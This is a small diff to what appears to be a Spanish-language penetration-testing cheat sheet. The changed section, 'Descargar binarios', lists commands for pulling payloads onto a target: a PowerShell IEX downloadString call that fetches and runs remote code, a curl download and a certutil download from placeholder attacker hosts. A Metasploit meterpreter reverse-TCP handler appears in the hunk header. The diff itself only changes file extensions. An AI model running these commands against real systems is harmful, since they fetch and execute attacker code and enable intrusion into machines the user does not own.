@@ -699,13 +699,13 @@ msfconsole -x "use multi/handler; set payload windows/meterpreter/reverse_tcp;se
 
 Descargar binarios
 ```
-powershell IEX(New-Object Net.WebClient).downloadString('http://IP:PORT/binary.exe')
+powershell IEX(New-Object Net.WebClient).downloadString('http://IP:PORT/binary.ext')
 ```
 ```
 curl "http://IP/binario" -o binario
 ```
 ```
-certutil -urlcache -f http://IP:PORT/binary.ext binary.exe
+certutil -urlcache -f http://IP:PORT/binary.ext binary.ext
 ```
 
 Buscar archivo
